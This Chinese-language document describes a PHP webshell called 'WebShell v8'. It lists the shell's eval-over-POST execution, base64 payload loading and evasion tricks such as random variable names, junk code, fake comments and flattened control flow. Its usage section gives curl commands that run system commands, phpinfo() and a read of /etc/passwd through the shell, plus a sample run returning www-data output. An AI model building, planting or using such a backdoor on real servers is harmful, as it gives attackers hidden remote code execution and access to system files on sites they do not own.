# WebShell v8 特性说明

## 1. 基础架构

### 1.1 基本结构
- 单文件PHP WebShell
- POST参数处理
- eval直接执行
- base64编码加载

### 1.2 文件特性
- 单一PHP文件
- 随机变量名
- 垃圾代码注入
- 控制流平展

## 2. 核心特性

### 2.1 代码执行
- 使用eval函数执行
- base64解码载入
- POST参数接收
- 直接代码执行

### 2.2 混淆技术
- 随机变量名生成
- 控制流程平展化
- 垃圾代码注入
- 假注释添加

### 2.3 参数处理
- POST方法接收
- 随机参数名
- 支持任意PHP代码
- 无参数验证

## 3. 隐蔽特性

### 3.1 代码混淆
- base64编码载荷
- switch-case控制流
- 随机数控制流程
- while循环包装

### 3.2 伪装技术
- 添加假注释
- 插入无用变量
- 添加死代码
- 随机变量命名

## 4. 使用方法

### 4.1 基本连接
```bash
# 执行系统命令
curl -X POST http://your-domain/webshell.php -d "cmd=system('id');"

# 执行PHP代码
curl -X POST http://your-domain/webshell.php -d "cmd=phpinfo();"

# 文件操作
curl -X POST http://your-domain/webshell.php -d "cmd=echo file_get_contents('/etc/passwd');"


curl -X POST http://172.30.0.2/webshell_2.php -d "BDKDH=system('id');"
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### 4.2 参数说明
- 参数名随机（cmd/x/q/随机5字符）
- 支持任意PHP代码
- 直接eval执行
- POST方法传递

### 4.3 注意事项
- 需要完整PHP代码
- 包含分号结尾
- 注意代码转义
- 避免语法错误

## 5. 版本定位

### 5.1 特点优势
- 基本的混淆能力
- 动态代码生成
- 灵活的代码执行
- 简单的隐蔽性

### 5.2 主要不足
- 无加密传输
- 无权限验证
- 无错误处理
- 易被静态检测 